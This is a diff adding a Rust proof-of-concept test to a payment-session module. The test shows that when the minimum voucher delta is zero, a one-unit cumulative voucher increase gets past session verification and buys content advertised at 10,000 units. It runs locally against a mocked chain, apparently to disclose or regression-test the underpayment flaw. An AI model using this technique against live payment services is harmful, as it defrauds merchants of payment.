@@ -1,0 +1,121 @@
+diff --git a/src/protocol/methods/tempo/session_method.rs b/src/protocol/methods/tempo/session_method.rs
+--- a/src/protocol/methods/tempo/session_method.rs
++++ b/src/protocol/methods/tempo/session_method.rs
+@@ -2287,6 +2287,117 @@ mod tests {
+         assert_eq!(result.unwrap_err().code, Some(ErrorCode::DeltaTooSmall));
+     }
+
++    /// Full local witness: the challenge advertises a 10,000-unit page price,
++    /// but a one-unit cumulative voucher increment crosses `Mpp::verify_session`
++    /// and the bundled multi-fetch content gate when min_voucher_delta is zero.
++    #[tokio::test]
++    async fn poc_full_mpp_one_unit_increment_buys_10000_unit_response() {
++        use crate::protocol::methods::tempo::session::SessionCredentialPayload;
++        use crate::protocol::methods::tempo::voucher::sign_voucher;
++        use alloy::{
++            primitives::Bytes,
++            providers::{mock::Asserter, ProviderBuilder},
++            signers::local::PrivateKeySigner,
++            sol_types::SolValue,
++        };
++
++        let signer = PrivateKeySigner::random();
++        let channel_id = format!("0x{}", "12".repeat(32));
++        let channel_id_b256 = channel_id.parse::<B256>().unwrap();
++        let escrow: Address = "0x5555555555555555555555555555555555555555"
++            .parse()
++            .unwrap();
++        let payee: Address = "0x2222222222222222222222222222222222222222"
++            .parse()
++            .unwrap();
++        let token: Address = "0x3333333333333333333333333333333333333333"
++            .parse()
++            .unwrap();
++        let advertised_price = 10_000u128;
++        let prior_cumulative = 10_000u128;
++        let attacker_cumulative = prior_cumulative + 1;
++
++        let store = Arc::new(InMemoryChannelStore::new());
++        let mut state = test_channel_state(&channel_id);
++        state.authorized_signer = signer.address();
++        state.highest_voucher_amount = prior_cumulative;
++        state.spent = prior_cumulative;
++        state.deposit = 100_000;
++        store.insert(&channel_id, state.clone());
++
++        let asserter = Asserter::new();
++        let on_chain_result = (
++            false,
++            0u64,
++            state.payer,
++            payee,
++            token,
++            signer.address(),
++            state.deposit,
++            0u128,
++        )
++            .abi_encode();
++        asserter.push_success(&Bytes::from(on_chain_result));
++        let provider =
++            ProviderBuilder::new_with_network::<TempoNetwork>().connect_mocked_client(asserter);
++
++        let charge_method = crate::protocol::methods::tempo::ChargeMethod::new(provider.clone());
++        let session_method = SessionMethod::new(
++            provider,
++            store.clone(),
++            SessionMethodConfig {
++                escrow_contract: escrow,
++                chain_id: 42431,
++                min_voucher_delta: 0,
++            },
++        );
++        let mpp = crate::server::Mpp::new_with_config(
++            charge_method,
++            "MPP Payment",
++            "local-price-poc-secret",
++            token.to_string(),
++            payee.to_string(),
++        )
++        .with_session_method(session_method);
++
++        let challenge = mpp
++            .session_challenge(
++                &advertised_price.to_string(),
++                &token.to_string(),
++                &payee.to_string(),
++            )
++            .unwrap();
++        let request: SessionRequest = challenge.request.decode().unwrap();
++        assert_eq!(request.amount, advertised_price.to_string());
++        let signature = sign_voucher(&signer, channel_id_b256, attacker_cumulative, escrow, 42431)
++            .await
++            .unwrap();
++        let credential = PaymentCredential::new(
++            challenge.to_echo(),
++            SessionCredentialPayload::Voucher {
++                channel_id: channel_id.clone(),
++                descriptor: None,
++                settlement_route: None,
++                cumulative_amount: attacker_cumulative.to_string(),
++                signature: format!("0x{}", alloy::primitives::hex::encode(signature)),
++            },
++        );
++
++        let verified = mpp.verify_session(&credential).await.unwrap();
++        let delivered = verified
++            .management_response
++            .is_none()
++            .then(|| "<paid scrape content>");
++        assert_eq!(delivered, Some("<paid scrape content>"));
++
++        let final_state = store.get_channel(&channel_id).await.unwrap().unwrap();
++        assert_eq!(final_state.highest_voucher_amount, attacker_cumulative);
++        assert_eq!(attacker_cumulative - prior_cumulative, 1);
++        assert_eq!(final_state.spent, prior_cumulative);
++        assert_eq!(final_state.highest_voucher_amount - final_state.spent, 1);
++        assert_eq!(advertised_price, 10_000);
++    }
++
+     #[tokio::test]
+     async fn test_accept_voucher_preserves_concurrent_deposit_update() {
+         use crate::protocol::methods::tempo::voucher::sign_voucher;
